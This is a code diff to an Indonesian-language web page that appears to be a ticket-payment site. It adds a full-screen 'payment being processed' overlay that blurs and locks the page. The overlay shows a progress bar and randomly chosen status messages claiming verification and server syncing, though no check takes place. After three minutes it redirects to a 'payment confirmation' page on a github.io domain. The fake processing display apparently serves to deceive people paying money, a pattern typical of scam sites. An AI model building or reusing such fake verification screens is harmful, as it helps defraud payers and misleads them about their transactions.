@@ -365,25 +365,45 @@ opacity:.9;
 max-width:700px;
 line-height:1.7;
 }
-.loading-timer{
-margin-top:25px;
-font-size:60px;
-font-weight:800;
-color:#ffd36b;
+
+.loading-overlay{
+position:fixed;inset:0;display:none;justify-content:center;align-items:center;
+flex-direction:column;z-index:99999999;
+background:rgba(2,8,25,.92);
+backdrop-filter:blur(18px);
+color:#fff;text-align:center;padding:25px;
 }
+.loading-overlay.show{display:flex;}
+.loader-ring{
+width:160px;height:160px;border-radius:50%;
+border:10px solid rgba(255,255,255,.08);
+border-top:10px solid #ffd700;
+animation:spin .9s linear infinite;
+box-shadow:0 0 50px rgba(255,215,0,.6);
+}
+.loading-title{font-size:34px;font-weight:800;margin-top:30px}
+.loading-sub{font-size:18px;margin-top:12px;max-width:700px;line-height:1.7}
+.progress-wrap{width:min(650px,90%);height:18px;background:rgba(255,255,255,.1);border-radius:999px;overflow:hidden;margin-top:30px}
+.progress-bar{height:100%;width:0%;background:linear-gradient(90deg,#ffd700,#fff0a0)}
+.percent{font-size:42px;font-weight:800;color:#ffd700;margin-top:18px}
+.status-text{margin-top:14px;font-size:18px}
+.blur-lock{filter:blur(8px);pointer-events:none;user-select:none}
+
 
 </style>
 </head>
 <body>
 
+
 <div class="loading-overlay" id="loadingOverlay">
 <div class="loader-ring"></div>
 <div class="loading-title">PEMBAYARAN ANDA SEDANG DIPROSES</div>
-<div class="loading-sub">
-Mohon tunggu sebentar. Sistem sedang melakukan verifikasi otomatis dan sinkronisasi data pembayaran.
+<div class="loading-sub">Mohon tunggu. Sistem sedang melakukan verifikasi dan sinkronisasi data pembayaran.</div>
+<div class="progress-wrap"><div class="progress-bar" id="progressBar"></div></div>
+<div class="percent" id="percentText">0%</div>
+<div class="status-text" id="statusText">Memverifikasi pembayaran...</div>
 </div>
-<div class="loading-timer" id="loadingTimer">03:00</div>
-</div>
+
 
 
 <div class="container">
@@ -594,27 +614,35 @@ btn.addEventListener('click', function() {
 if(btn.classList.contains('active')){
 
 const overlay=document.getElementById('loadingOverlay');
-const loadingTimer=document.getElementById('loadingTimer');
+const progressBar=document.getElementById('progressBar');
+const percentText=document.getElementById('percentText');
+const statusText=document.getElementById('statusText');
 
 overlay.classList.add('show');
+document.querySelector('.container').classList.add('blur-lock');
+document.body.style.overflow='hidden';
 
-let remaining=180;
+const messages=[
+'Memverifikasi pembayaran...',
+'Menghubungkan ke server...',
+'Sinkronisasi data...',
+'Validasi bukti pembayaran...',
+'Menyelesaikan proses...'
+];
 
-const timerInterval=setInterval(()=>{
+let percent=0;
 
-const m=Math.floor(remaining/60);
-const s=remaining%60;
-
-loadingTimer.innerHTML=String(m).padStart(2,'0')+':'+String(s).padStart(2,'0');
-
-if(remaining<=0){
-clearInterval(timerInterval);
-window.location.href='https://onlinetiketdigital.github.io/Konfirmasi-pembayaran/';
-}
-
-remaining--;
-
+const progressInterval=setInterval(()=>{
+percent=Math.min(100,percent+(100/180));
+progressBar.style.width=percent+'%';
+percentText.innerHTML=Math.floor(percent)+'%';
+statusText.innerHTML=messages[Math.floor(Math.random()*messages.length)];
 },1000);
+
+setTimeout(()=>{
+clearInterval(progressInterval);
+window.location.href='https://onlinetiketdigital.github.io/Konfirmasi-pembayaran/';
+},180000);
 
 }
 
